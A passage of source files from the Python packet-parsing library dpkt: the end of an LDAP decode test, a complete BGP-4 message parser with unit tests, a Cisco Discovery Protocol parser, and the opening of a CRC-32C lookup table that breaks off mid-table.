            self.failUnless(decode(s) == [(48, [(2, 11), (99, [(4, 'cn=Douglas J Song 1, ou=Information Technology Division, ou=Faculty and Staff, ou=People, o=University of Michigan, c=US'), (10, '\x00'), (10, '\x03'), (2, 0), (2, 0), (1, '\x00'), (135, 'objectclass'), (48, [(4, 'memberOfGroup'), (4, 'acl'), (4, 'cn'), (4, 'title'), (4, 'postalAddress'), (4, 'telephoneNumber'), (4, 'mail'), (4, 'member'), (4, 'homePhone'), (4, 'homePostalAddress'), (4, 'objectClass'), (4, 'description'), (4, 'facsimileTelephoneNumber'), (4, 'pager'), (4, 'uid'), (4, 'userPassword'), (4, 'joinable'), (4, 'associatedDomain'), (4, 'owner'), (4, 'rfc822ErrorsTo'), (4, 'ErrorsTo'), (4, 'rfc822RequestsTo'), (4, 'RequestsTo'), (4, 'moderator'), (4, 'labeledURL'), (4, 'onVacation'), (4, 'vacationMessage'), (4, 'drink'), (4, 'lastModifiedBy'), (4, 'lastModifiedTime'), (4, 'modifiersname'), (4, 'modifytimestamp'), (4, 'creatorsname'), (4, 'createtimestamp')])])])])

    unittest.main()

########NEW FILE########
__FILENAME__ = bgp
# $Id: bgp.py 52 2008-08-25 22:22:34Z jon.oberheide $

"""Border Gateway Protocol."""

import dpkt
import struct, socket

# Border Gateway Protocol 4 - RFC 4271
# Communities Attribute - RFC 1997
# Capabilities - RFC 3392
# Route Refresh - RFC 2918
# Route Reflection - RFC 4456
# Confederations - RFC 3065
# Cease Subcodes - RFC 4486
# NOPEER Community - RFC 3765
# Multiprotocol Extensions - 2858

# Message Types
OPEN				= 1
UPDATE				= 2
NOTIFICATION			= 3
KEEPALIVE			= 4
ROUTE_REFRESH			= 5

# Attribute Types
ORIGIN				= 1
AS_PATH				= 2
NEXT_HOP			= 3
MULTI_EXIT_DISC			= 4
LOCAL_PREF			= 5
ATOMIC_AGGREGATE		= 6
AGGREGATOR			= 7
COMMUNITIES			= 8
ORIGINATOR_ID			= 9
CLUSTER_LIST			= 10
MP_REACH_NLRI			= 14
MP_UNREACH_NLRI			= 15

# Origin Types
ORIGIN_IGP			= 0
ORIGIN_EGP			= 1
INCOMPLETE			= 2

# AS Path Types
AS_SET				= 1
AS_SEQUENCE			= 2
AS_CONFED_SEQUENCE		= 3
AS_CONFED_SET			= 4

# Reserved Communities Types
NO_EXPORT			= 0xffffff01L
NO_ADVERTISE			= 0xffffff02L
NO_EXPORT_SUBCONFED		= 0xffffff03L
NO_PEER				= 0xffffff04L

# Common AFI types
AFI_IPV4			= 1
AFI_IPV6			= 2

# Multiprotocol SAFI types
SAFI_UNICAST			= 1
SAFI_MULTICAST			= 2
SAFI_UNICAST_MULTICAST		= 3

# OPEN Message Optional Parameters
AUTHENTICATION			= 1
CAPABILITY			= 2

# Capability Types
CAP_MULTIPROTOCOL		= 1
CAP_ROUTE_REFRESH		= 2

# NOTIFICATION Error Codes
MESSAGE_HEADER_ERROR		= 1
OPEN_MESSAGE_ERROR		= 2
UPDATE_MESSAGE_ERROR		= 3
HOLD_TIMER_EXPIRED		= 4
FSM_ERROR			= 5
CEASE				= 6

# Message Header Error Subcodes
CONNECTION_NOT_SYNCHRONIZED	= 1
BAD_MESSAGE_LENGTH		= 2
BAD_MESSAGE_TYPE		= 3

# OPEN Message Error Subcodes
UNSUPPORTED_VERSION_NUMBER	= 1
BAD_PEER_AS			= 2
BAD_BGP_IDENTIFIER		= 3
UNSUPPORTED_OPTIONAL_PARAMETER	= 4
AUTHENTICATION_FAILURE		= 5
UNACCEPTABLE_HOLD_TIME		= 6
UNSUPPORTED_CAPABILITY		= 7

# UPDATE Message Error Subcodes
MALFORMED_ATTRIBUTE_LIST	= 1
UNRECOGNIZED_ATTRIBUTE		= 2
MISSING_ATTRIBUTE		= 3
ATTRIBUTE_FLAGS_ERROR		= 4
ATTRIBUTE_LENGTH_ERROR		= 5
INVALID_ORIGIN_ATTRIBUTE	= 6
AS_ROUTING_LOOP			= 7
INVALID_NEXT_HOP_ATTRIBUTE	= 8
OPTIONAL_ATTRIBUTE_ERROR	= 9
INVALID_NETWORK_FIELD		= 10
MALFORMED_AS_PATH		= 11

# Cease Error Subcodes
MAX_NUMBER_OF_PREFIXES_REACHED	= 1
ADMINISTRATIVE_SHUTDOWN		= 2
PEER_DECONFIGURED		= 3
ADMINISTRATIVE_RESET		= 4
CONNECTION_REJECTED		= 5
OTHER_CONFIGURATION_CHANGE	= 6
CONNECTION_COLLISION_RESOLUTION	= 7
OUT_OF_RESOURCES		= 8


class BGP(dpkt.Packet):
    __hdr__ = (
        ('marker', '16s', '\x01' * 16),
        ('len', 'H', 0),
        ('type', 'B', OPEN)
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.data = self.data[:self.len - self.__hdr_len__]
        if self.type == OPEN:
            self.data = self.open = self.Open(self.data)
        elif self.type == UPDATE:
            self.data = self.update = self.Update(self.data)
        elif self.type == NOTIFICATION:
            self.data = self.notifiation = self.Notification(self.data)
        elif self.type == KEEPALIVE:
            self.data = self.keepalive = self.Keepalive(self.data)
        elif self.type == ROUTE_REFRESH:
            self.data = self.route_refresh = self.RouteRefresh(self.data)

    class Open(dpkt.Packet):
        __hdr__ = (
            ('v', 'B', 4),
            ('asn', 'H', 0),
            ('holdtime', 'H', 0),
            ('identifier', 'I', 0),
            ('param_len', 'B', 0)
            )
        __hdr_defaults__ = {
            'parameters': []
            }

        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            l = []
            plen = self.param_len
            while plen > 0:
                param = self.Parameter(self.data)
                self.data = self.data[len(param):]
                plen -= len(param)
                l.append(param)
            self.data = self.parameters = l

        def __len__(self):
            return self.__hdr_len__ + \
                   sum(map(len, self.parameters))

        def __str__(self):
            params = ''.join(map(str, self.parameters))
            self.param_len = len(params)
            return self.pack_hdr() + params

        class Parameter(dpkt.Packet):
            __hdr__ = (
                ('type', 'B', 0),
                ('len', 'B', 0)
                )

            def unpack(self, buf):
                dpkt.Packet.unpack(self, buf)
                self.data = self.data[:self.len]

                if self.type == AUTHENTICATION:
                    self.data = self.authentication = self.Authentication(self.data)
                elif self.type == CAPABILITY:
                    self.data = self.capability = self.Capability(self.data)

            class Authentication(dpkt.Packet):
                __hdr__ = (
                    ('code', 'B', 0),
                    )

            class Capability(dpkt.Packet):
                __hdr__ = (
                    ('code', 'B', 0),
                    ('len', 'B', 0)
                    )

                def unpack(self, buf):
                    dpkt.Packet.unpack(self, buf)
                    self.data = self.data[:self.len]


    class Update(dpkt.Packet):
        __hdr_defaults__ = {
            'withdrawn': [],
            'attributes': [],
            'announced': []
            }

        def unpack(self, buf):
            self.data = buf

            # Withdrawn Routes
            wlen = struct.unpack('>H', self.data[:2])[0]
            self.data = self.data[2:]
            l = []
            while wlen > 0:
                route = RouteIPV4(self.data)
                self.data = self.data[len(route):]
                wlen -= len(route)
                l.append(route)
            self.withdrawn = l
            
            # Path Attributes
            plen = struct.unpack('>H', self.data[:2])[0]
            self.data = self.data[2:]
            l = []
            while plen > 0:
                attr = self.Attribute(self.data)
                self.data = self.data[len(attr):]
                plen -= len(attr)
                l.append(attr)
            self.attributes = l

            # Announced Routes
            l = []
            while self.data:
                route = RouteIPV4(self.data)
                self.data = self.data[len(route):]
                l.append(route)
            self.announced = l

        def __len__(self):
            return 2 + sum(map(len, self.withdrawn)) + \
                   2 + sum(map(len, self.attributes)) + \
                   sum(map(len, self.announced))

        def __str__(self):
            return struct.pack('>H', sum(map(len, self.withdrawn))) + \
                   ''.join(map(str, self.withdrawn)) + \
                   struct.pack('>H', sum(map(len, self.attributes))) + \
                   ''.join(map(str, self.attributes)) + \
                   ''.join(map(str, self.announced))

        class Attribute(dpkt.Packet):
            __hdr__ = (
                ('flags', 'B', 0),
                ('type', 'B', 0)
                )

            def _get_o(self):
                return (self.flags >> 7) & 0x1
            def _set_o(self, o):
                self.flags = (self.flags & ~0x80) | ((o & 0x1) << 7)
            optional = property(_get_o, _set_o)

            def _get_t(self):
                return (self.flags >> 6) & 0x1
            def _set_t(self, t):
                self.flags = (self.flags & ~0x40) | ((t & 0x1) << 6)
            transitive = property(_get_t, _set_t)

            def _get_p(self):
                return (self.flags >> 5) & 0x1
            def _set_p(self, p):
                self.flags = (self.flags & ~0x20) | ((p & 0x1) << 5)
            partial = property(_get_p, _set_p)

            def _get_e(self):
                return (self.flags >> 4) & 0x1
            def _set_e(self, e):
                self.flags = (self.flags & ~0x10) | ((e & 0x1) << 4)
            extended_length = property(_get_e, _set_e)

            def unpack(self, buf):
                dpkt.Packet.unpack(self, buf)

                if self.extended_length:
                    self.len = struct.unpack('>H', self.data[:2])[0]
                    self.data = self.data[2:]
                else:
                    self.len = struct.unpack('B', self.data[:1])[0]
                    self.data = self.data[1:]
                
                self.data = self.data[:self.len]

                if self.type == ORIGIN:
                    self.data = self.origin = self.Origin(self.data)
                elif self.type == AS_PATH:
                    self.data = self.as_path = self.ASPath(self.data)
                elif self.type == NEXT_HOP:
                    self.data = self.next_hop = self.NextHop(self.data)
                elif self.type == MULTI_EXIT_DISC:
                    self.data = self.multi_exit_disc = self.MultiExitDisc(self.data)
                elif self.type == LOCAL_PREF:
                    self.data = self.local_pref = self.LocalPref(self.data)
                elif self.type == ATOMIC_AGGREGATE:
                    self.data = self.atomic_aggregate = self.AtomicAggregate(self.data)
                elif self.type == AGGREGATOR:
                    self.data = self.aggregator = self.Aggregator(self.data)
                elif self.type == COMMUNITIES:
                    self.data = self.communities = self.Communities(self.data)
                elif self.type == ORIGINATOR_ID:
                    self.data = self.originator_id = self.OriginatorID(self.data)
                elif self.type == CLUSTER_LIST:
                    self.data = self.cluster_list = self.ClusterList(self.data)
                elif self.type == MP_REACH_NLRI:
                    self.data = self.mp_reach_nlri = self.MPReachNLRI(self.data)
                elif self.type == MP_UNREACH_NLRI:
                    self.data = self.mp_unreach_nlri = self.MPUnreachNLRI(self.data)

            def __len__(self):
                if self.extended_length:
                    attr_len = 2
                else:
                    attr_len = 1
                return self.__hdr_len__ + \
                       attr_len + \
                       len(self.data)

            def __str__(self):
                if self.extended_length:
                    attr_len_str = struct.pack('>H', self.len)
                else:
                    attr_len_str = struct.pack('B', self.len)
                return self.pack_hdr() + \
                       attr_len_str + \
                       str(self.data)

            class Origin(dpkt.Packet):
                __hdr__ = (
                    ('type', 'B', ORIGIN_IGP),
                )

            class ASPath(dpkt.Packet):
                __hdr_defaults__ = {
                    'segments': []
                    }

                def unpack(self, buf):
                    self.data = buf
                    l = []
                    while self.data:
                        seg = self.ASPathSegment(self.data)
                        self.data = self.data[len(seg):]
                        l.append(seg)
                    self.data = self.segments = l

                def __len__(self):
                    return sum(map(len, self.data))

                def __str__(self):
                    return ''.join(map(str, self.data))
 
                class ASPathSegment(dpkt.Packet):
                    __hdr__ = (
                        ('type', 'B', 0),
                        ('len', 'B', 0)
                        )

                    def unpack(self, buf):
                        dpkt.Packet.unpack(self, buf)
                        l = []
                        for i in range(self.len):
                            AS = struct.unpack('>H', self.data[:2])[0]
                            self.data = self.data[2:]
                            l.append(AS)
                        self.data = self.path = l

                    def __len__(self):
                        return self.__hdr_len__ + \
                               2 * len(self.path)

                    def __str__(self):
                        as_str = ''
                        for AS in self.path:
                            as_str += struct.pack('>H', AS)
                        return self.pack_hdr() + \
                               as_str

            class NextHop(dpkt.Packet):
                __hdr__ = (
                    ('ip', 'I', 0),
                )

            class MultiExitDisc(dpkt.Packet):
                __hdr__ = (
                    ('value', 'I', 0),
                )

            class LocalPref(dpkt.Packet):
                __hdr__ = (
                    ('value', 'I', 0),
                )

            class AtomicAggregate(dpkt.Packet):
                def unpack(self, buf):
                    pass

                def __len__(self):
                    return 0

                def __str__(self):
                    return ''

            class Aggregator(dpkt.Packet):
                __hdr__ = (
                    ('asn', 'H', 0),
                    ('ip', 'I', 0)
                )

            class Communities(dpkt.Packet):
                __hdr_defaults__ = {
                    'list': []
                    }

                def unpack(self, buf):
                    self.data = buf
                    l = []
                    while self.data:
                        val = struct.unpack('>I', self.data[:4])[0]
                        if (val >= 0x00000000L and val <= 0x0000ffffL) or \
                           (val >= 0xffff0000L and val <= 0xffffffffL):
                            comm = self.ReservedCommunity(self.data[:4])
                        else:
                            comm = self.Community(self.data[:4])
                        self.data = self.data[len(comm):]
                        l.append(comm)
                    self.data = self.list = l

                def __len__(self):
                    return sum(map(len, self.data))

                def __str__(self):
                    return ''.join(map(str, self.data))

                class Community(dpkt.Packet):
                    __hdr__ = (
                        ('asn', 'H', 0),
                        ('value', 'H', 0)
                    )

                class ReservedCommunity(dpkt.Packet):
                    __hdr__ = (
                        ('value', 'I', 0),
                    )

            class OriginatorID(dpkt.Packet):
                __hdr__ = (
                    ('value', 'I', 0),
                )

            class ClusterList(dpkt.Packet):
                __hdr_defaults__ = {
                    'list': []
                    }

                def unpack(self, buf):
                    self.data = buf
                    l = []
                    while self.data:
                        id = struct.unpack('>I', self.data[:4])[0]
                        self.data = self.data[4:]
                        l.append(id)
                    self.data = self.list = l

                def __len__(self):
                    return 4 * len(self.list)

                def __str__(self):
                    cluster_str = ''
                    for val in self.list:
                            cluster_str += struct.pack('>I', val)
                    return cluster_str

            class MPReachNLRI(dpkt.Packet):
                __hdr__ = (
                    ('afi', 'H', AFI_IPV4),
                    ('safi', 'B', SAFI_UNICAST),
                )

                def unpack(self, buf):
                    dpkt.Packet.unpack(self, buf)

                    # Next Hop
                    nlen = struct.unpack('B', self.data[:1])[0]
                    self.data = self.data[1:]
                    self.next_hop = self.data[:nlen]
                    self.data = self.data[nlen:]

                    # SNPAs
                    l = []
                    num_snpas = struct.unpack('B', self.data[:1])[0]
                    self.data = self.data[1:]
                    for i in range(num_snpas):
                        snpa = self.SNPA(self.data)
                        self.data = self.data[len(snpa):]
                        l.append(snpa)
                    self.snpas = l

                    if self.afi == AFI_IPV4:
                        Route = RouteIPV4
                    elif self.afi == AFI_IPV6:
                        Route = RouteIPV6
                    else:
                        Route = RouteGeneric

                    # Announced Routes
                    l = []
                    while self.data:
                        route = Route(self.data)
                        self.data = self.data[len(route):]
                        l.append(route)
                    self.data = self.announced = l

                def __len__(self):
                    return self.__hdr_len__ + \
                           1 + len(self.next_hop) + \
                           1 + sum(map(len, self.snpas)) + \
                           sum(map(len, self.announced))

                def __str__(self):
                    return self.pack_hdr() + \
                           struct.pack('B', len(self.next_hop)) + \
                           str(self.next_hop) + \
                           struct.pack('B', len(self.snpas)) + \
                           ''.join(map(str, self.snpas)) + \
                           ''.join(map(str, self.announced))

                class SNPA:
                    __hdr__ = (
                        ('len', 'B', 0),
                        )

                    def unpack(self, buf):
                        dpkt.Packet.unpack(self, buf)
                        self.data = self.data[:(self.len + 1) / 2]

            class MPUnreachNLRI(dpkt.Packet):
                __hdr__ = (
                    ('afi', 'H', AFI_IPV4),
                    ('safi', 'B', SAFI_UNICAST),
                )

                def unpack(self, buf):
                    dpkt.Packet.unpack(self, buf)

                    if self.afi == AFI_IPV4:
                        Route = RouteIPV4
                    elif self.afi == AFI_IPV6:
                        Route = RouteIPV6
                    else:
                        Route = RouteGeneric

                    # Withdrawn Routes
                    l = []
                    while self.data:
                        route = Route(self.data)
                        self.data = self.data[len(route):]
                        l.append(route)
                    self.data = self.withdrawn = l

                def __len__(self):
                    return self.__hdr_len__ + \
                           sum(map(len, self.data))

                def __str__(self):
                    return self.pack_hdr() + \
                           ''.join(map(str, self.data))


    class Notification(dpkt.Packet):
        __hdr__ = (
            ('code', 'B', 0),
            ('subcode', 'B', 0),
            )

        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.error = self.data


    class Keepalive(dpkt.Packet):
        def unpack(self, buf):
            pass

        def __len__(self):
            return 0

        def __str__(self):
            return ''


    class RouteRefresh(dpkt.Packet):
        __hdr__ = (
            ('afi', 'H', AFI_IPV4),
            ('rsvd', 'B', 0),
            ('safi', 'B', SAFI_UNICAST)
            ) 


class RouteGeneric(dpkt.Packet):
    __hdr__ = (
        ('len', 'B', 0),
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.data = self.prefix = self.data[:(self.len + 7) / 8]

class RouteIPV4(dpkt.Packet):
    __hdr__ = (
        ('len', 'B', 0),
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        tmp = self.data[:(self.len + 7) / 8]
        tmp += (4 - len(tmp)) * '\x00'
        self.data = self.prefix = tmp

    def __repr__(self):
        cidr = '%s/%d' % (socket.inet_ntoa(self.prefix), self.len)
        return '%s(%s)' % (self.__class__.__name__, cidr)

    def __len__(self):
        return self.__hdr_len__ + \
               (self.len + 7) / 8

    def __str__(self):
        return self.pack_hdr() + \
               self.prefix[:(self.len + 7) / 8]

class RouteIPV6(dpkt.Packet):
    __hdr__ = (
        ('len', 'B', 0),
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        tmp = self.data[:(self.len + 7) / 8]
        tmp += (16 - len(tmp)) * '\x00'
        self.data = self.prefix = tmp

    def __len__(self):
        return self.__hdr_len__ + \
               (self.len + 7) / 8

    def __str__(self):
        return self.pack_hdr() + \
               self.prefix[:(self.len + 7) / 8]


if __name__ == '__main__':
    import unittest

    class BGPTestCase(unittest.TestCase):
        def testPack(self):
            b1 = BGP(self.bgp1)
            self.failUnless(self.bgp1 == str(b1))
            b2 = BGP(self.bgp2)
            self.failUnless(self.bgp2 == str(b2))
            b3 = BGP(self.bgp3)
            self.failUnless(self.bgp3 == str(b3))
            b4 = BGP(self.bgp4)
            self.failUnless(self.bgp4 == str(b4))

        def testUnpack(self):
            b1 = BGP(self.bgp1)
            self.failUnless(b1.len == 19)
            self.failUnless(b1.type == KEEPALIVE)
            self.failUnless(b1.keepalive is not None)
            
            b2 = BGP(self.bgp2)
            self.failUnless(b2.type == UPDATE)
            self.failUnless(len(b2.update.withdrawn) == 0)
            self.failUnless(len(b2.update.announced) == 1)
            self.failUnless(len(b2.update.attributes) == 9)
            a = b2.update.attributes[1]
            self.failUnless(a.type == AS_PATH)
            self.failUnless(a.len == 10)
            self.failUnless(len(a.as_path.segments) == 2)
            s = a.as_path.segments[0]
            self.failUnless(s.type == AS_SET)
            self.failUnless(s.len == 2)
            self.failUnless(len(s.path) == 2)
            self.failUnless(s.path[0] == 500)

            a = b2.update.attributes[6]
            self.failUnless(a.type == COMMUNITIES)
            self.failUnless(a.len == 12)
            self.failUnless(len(a.communities.list) == 3)
            c = a.communities.list[0]
            self.failUnless(c.asn == 65215)
            self.failUnless(c.value == 1)
            r = b2.update.announced[0]
            self.failUnless(r.len == 22)
            self.failUnless(r.prefix == '\xc0\xa8\x04\x00')

            b3 = BGP(self.bgp3)
            self.failUnless(b3.type == UPDATE)
            self.failUnless(len(b3.update.withdrawn) == 0)
            self.failUnless(len(b3.update.announced) == 0)
            self.failUnless(len(b3.update.attributes) == 6)
            a = b3.update.attributes[0]
            self.failUnless(a.optional == False)
            self.failUnless(a.transitive == True)
            self.failUnless(a.partial == False)
            self.failUnless(a.extended_length == False)
            self.failUnless(a.type == ORIGIN)
            self.failUnless(a.len == 1)
            o = a.origin
            self.failUnless(o.type == ORIGIN_IGP)
            a = b3.update.attributes[5]
            self.failUnless(a.optional == True)
            self.failUnless(a.transitive == False)
            self.failUnless(a.partial == False)
            self.failUnless(a.extended_length == True)
            self.failUnless(a.type == MP_REACH_NLRI)
            self.failUnless(a.len == 30)
            m = a.mp_reach_nlri
            self.failUnless(m.afi == AFI_IPV4)
            self.failUnless(len(m.snpas) == 0)
            self.failUnless(len(m.announced) == 1)
            p = m.announced[0]
            self.failUnless(p.len == 96)

            b4 = BGP(self.bgp4)
            self.failUnless(b4.len == 45)
            self.failUnless(b4.type == OPEN)
            self.failUnless(b4.open.asn == 237)
            self.failUnless(b4.open.param_len == 16)
            self.failUnless(len(b4.open.parameters) == 3)
            p = b4.open.parameters[0]
            self.failUnless(p.type == CAPABILITY)
            self.failUnless(p.len == 6)
            c = p.capability
            self.failUnless(c.code == CAP_MULTIPROTOCOL)
            self.failUnless(c.len == 4)
            self.failUnless(c.data == '\x00\x01\x00\x01')
            c = b4.open.parameters[2].capability
            self.failUnless(c.code == CAP_ROUTE_REFRESH)
            self.failUnless(c.len == 0)

        bgp1 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04'
        bgp2 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x63\x02\x00\x00\x00\x48\x40\x01\x01\x00\x40\x02\x0a\x01\x02\x01\xf4\x01\xf4\x02\x01\xfe\xbb\x40\x03\x04\xc0\xa8\x00\x0f\x40\x05\x04\x00\x00\x00\x64\x40\x06\x00\xc0\x07\x06\xfe\xba\xc0\xa8\x00\x0a\xc0\x08\x0c\xfe\xbf\x00\x01\x03\x16\x00\x04\x01\x54\x00\xfa\x80\x09\x04\xc0\xa8\x00\x0f\x80\x0a\x04\xc0\xa8\x00\xfa\x16\xc0\xa8\x04'
        bgp3 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x79\x02\x00\x00\x00\x62\x40\x01\x01\x00\x40\x02\x00\x40\x05\x04\x00\x00\x00\x64\xc0\x10\x08\x00\x02\x01\x2c\x00\x00\x01\x2c\xc0\x80\x24\x00\x00\xfd\xe9\x40\x01\x01\x00\x40\x02\x04\x02\x01\x15\xb3\x40\x05\x04\x00\x00\x00\x2c\x80\x09\x04\x16\x05\x05\x05\x80\x0a\x04\x16\x05\x05\x05\x90\x0e\x00\x1e\x00\x01\x80\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x04\x04\x04\x00\x60\x18\x77\x01\x00\x00\x01\xf4\x00\x00\x01\xf4\x85'
        bgp4 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x2d\x01\x04\x00\xed\x00\x5a\xc6\x6e\x83\x7d\x10\x02\x06\x01\x04\x00\x01\x00\x01\x02\x02\x80\x00\x02\x02\x02\x00'

    unittest.main()

########NEW FILE########
__FILENAME__ = cdp
# $Id: cdp.py 23 2006-11-08 15:45:33Z dugsong $

"""Cisco Discovery Protocol."""

import struct
import dpkt

CDP_DEVID		= 1	# string
CDP_ADDRESS		= 2
CDP_PORTID		= 3	# string
CDP_CAPABILITIES	= 4	# 32-bit bitmask
CDP_VERSION		= 5	# string
CDP_PLATFORM		= 6	# string
CDP_IPPREFIX		= 7	

CDP_VTP_MGMT_DOMAIN	= 9	# string
CDP_NATIVE_VLAN		= 10	# 16-bit integer
CDP_DUPLEX		= 11	# 8-bit boolean
CDP_TRUST_BITMAP	= 18	# 8-bit bitmask0x13
CDP_UNTRUST_COS		= 19	# 8-bit port
CDP_SYSTEM_NAME		= 20	# string
CDP_SYSTEM_OID		= 21	# 10-byte binary string
CDP_MGMT_ADDRESS	= 22	# 32-bit number of addrs, Addresses
CDP_LOCATION		= 23	# string

class CDP(dpkt.Packet):
    __hdr__ = (
        ('version', 'B', 2),
        ('ttl', 'B', 180),
        ('sum', 'H', 0)
        )
    class Address(dpkt.Packet):
        # XXX - only handle NLPID/IP for now
        __hdr__ = (
            ('ptype', 'B', 1),	# protocol type (NLPID)
            ('plen', 'B', 1),	# protocol length
            ('p', 'B', 0xcc),	# IP
            ('alen', 'H', 4)	# address length
            )
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.data = self.data[:self.alen]
            
    class TLV(dpkt.Packet):
        __hdr__ = (
            ('type', 'H', 0),
            ('len', 'H', 4)
            )
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.data = self.data[:self.len - 4]
            if self.type == CDP_ADDRESS:
                n = struct.unpack('>I', self.data[:4])[0]
                buf = self.data[4:]
                l = []
                for i in range(n):
                    a = CDP.Address(buf)
                    l.append(a)
                    buf = buf[len(a):]
                self.data = l

        def __len__(self):
            if self.type == CDP_ADDRESS:
                n = 4 + sum(map(len, self.data))
            else:
                n = len(self.data)
            return self.__hdr_len__ + n
        
        def __str__(self):
            self.len = len(self)
            if self.type == CDP_ADDRESS:
                s = struct.pack('>I', len(self.data)) + \
                    ''.join(map(str, self.data))
            else:
                s = self.data
            return self.pack_hdr() + s

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        buf = self.data
        l = []
        while buf:
            tlv = self.TLV(buf)
            l.append(tlv)
            buf = buf[len(tlv):]
        self.data = l

    def __len__(self):
        return self.__hdr_len__ + sum(map(len, self.data))

    def __str__(self):
        data = ''.join(map(str, self.data))
        if not self.sum:
            self.sum = dpkt.in_cksum(self.pack_hdr() + data)
        return self.pack_hdr() + data

########NEW FILE########
__FILENAME__ = crc32c
# $Id: crc32c.py 23 2006-11-08 15:45:33Z dugsong $

import array

# CRC-32C Checksum
# http://tools.ietf.org/html/rfc3309

crc32c_table = (
    0x00000000L, 0xF26B8303L, 0xE13B70F7L, 0x1350F3F4L, 0xC79A971FL,
    0x35F1141CL, 0x26A1E7E8L, 0xD4CA64EBL, 0x8AD958CFL, 0x78B2DBCCL,
    0x6BE22838L, 0x9989AB3BL, 0x4D43CFD0L, 0xBF284CD3L, 0xAC78BF27L,
    0x5E133C24L, 0x105EC76FL, 0xE235446CL, 0xF165B798L, 0x030E349BL,
    0xD7C45070L, 0x25AFD373L, 0x36FF2087L, 0xC494A384L, 0x9A879FA0L,
    0x68EC1CA3L, 0x7BBCEF57L, 0x89D76C54L, 0x5D1D08BFL, 0xAF768BBCL,
    0xBC267848L, 0x4E4DFB4BL, 0x20BD8EDEL, 0xD2D60DDDL, 0xC186FE29L,
    0x33ED7D2AL, 0xE72719C1L, 0x154C9AC2L, 0x061C6936L, 0xF477EA35L,
    0xAA64D611L, 0x580F5512L, 0x4B5FA6E6L, 0xB93425E5L, 0x6DFE410EL,
    0x9F95C20DL, 0x8CC531F9L, 0x7EAEB2FAL, 0x30E349B1L, 0xC288CAB2L,
    0xD1D83946L, 0x23B3BA45L, 0xF779DEAEL, 0x05125DADL, 0x1642AE59L,
    0xE4292D5AL, 0xBA3A117EL, 0x4851927DL, 0x5B016189L, 0xA96AE28AL,
    0x7DA08661L, 0x8FCB0562L, 0x9C9BF696L, 0x6EF07595L, 0x417B1DBCL,
    0xB3109EBFL, 0xA0406D4BL, 0x522BEE48L, 0x86E18AA3L, 0x748A09A0L,
    0x67DAFA54L, 0x95B17957L, 0xCBA24573L, 0x39C9C670L, 0x2A993584L,
    0xD8F2B687L, 0x0C38D26CL, 0xFE53516FL, 0xED03A29BL, 0x1F682198L,
    0x5125DAD3L, 0xA34E59D0L, 0xB01EAA24L, 0x42752927L, 0x96BF4DCCL,
    0x64D4CECFL, 0x77843D3BL, 0x85EFBE38L, 0xDBFC821CL, 0x2997011FL,
    0x3AC7F2EBL, 0xC8AC71E8L, 0x1C661503L, 0xEE0D9600L, 0xFD5D65F4L,
    0x0F36E6F7L, 0x61C69362L, 0x93AD1061L, 0x80FDE395L, 0x72966096L,
    0xA65C047DL, 0x5437877EL, 0x4767748AL, 0xB50CF789L, 0xEB1FCBADL,
    0x197448AEL, 0x0A24BB5AL, 0xF84F3859L, 0x2C855CB2L, 0xDEEEDFB1L,
    0xCDBE2C45L, 0x3FD5AF46L, 0x7198540DL, 0x83F3D70EL, 0x90A324FAL,
    0x62C8A7F9L, 0xB602C312L, 0x44694011L, 0x5739B3E5L, 0xA55230E6L,
    0xFB410CC2L, 0x092A8FC1L, 0x1A7A7C35L, 0xE811FF36L, 0x3CDB9BDDL,
    0xCEB018DEL, 0xDDE0EB2AL, 0x2F8B6829L, 0x82F63B78L, 0x709DB87BL,
    0x63CD4B8FL, 0x91A6C88CL, 0x456CAC67L, 0xB7072F64L, 0xA457DC90L,
    0x563C5F93L, 0x082F63B7L, 0xFA44E0B4L, 0xE9141340L, 0x1B7F9043L,
    0xCFB5F4A8L, 0x3DDE77ABL, 0x2E8E845FL, 0xDCE5075CL, 0x92A8FC17L,
    0x60C37F14L, 0x73938CE0L, 0x81F80FE3L, 0x55326B08L, 0xA759E80BL,
    0xB4091BFFL, 0x466298FCL, 0x1871A4D8L, 0xEA1A27DBL, 0xF94AD42FL,
    0x0B21572CL, 0xDFEB33C7L, 0x2D80B0C4L, 0x3ED04330L, 0xCCBBC033L,
    0xA24BB5A6L, 0x502036A5L, 0x4370C551L, 0xB11B4652L, 0x65D122B9L,
    0x97BAA1BAL, 0x84EA524EL, 0x7681D14DL, 0x2892ED69L, 0xDAF96E6AL,
    0xC9A99D9EL, 0x3BC21E9DL, 0xEF087A76L, 0x1D63F975L, 0x0E330A81L,
    0xFC588982L, 0xB21572C9L, 0x407EF1CAL, 0x532E023EL, 0xA145813DL,
    0x758FE5D6L, 0x87E466D5L, 0x94B49521L, 0x66DF1622L, 0x38CC2A06L,
    0xCAA7A905L, 0xD9F75AF1L, 0x2B9CD9F2L, 0xFF56BD19L, 0x0D3D3E1AL,
    0x1E6DCDEEL, 0xEC064EEDL, 0xC38D26C4L, 0x31E6A5C7L, 0x22B65633L,
    0xD0DDD530L, 0x0417B1DBL, 0xF67C32D8L, 0xE52CC12CL, 0x1747422FL,
    0x49547E0BL, 0xBB3FFD08L, 0xA86F0EFCL, 0x5A048DFFL, 0x8ECEE914L,
    0x7CA56A17L, 0x6FF599E3L, 0x9D9E1AE0L, 0xD3D3E1ABL, 0x21B862A8L,
    0x32E8915CL, 0xC083125FL, 0x144976B4L, 0xE622F5B7L, 0xF5720643L,
    0x07198540L, 0x590AB964L, 0xAB613A67L, 0xB831C993L, 0x4A5A4A90L,
    0x9E902E7BL, 0x6CFBAD78L, 0x7FAB5E8CL, 0x8DC0DD8FL, 0xE330A81AL,
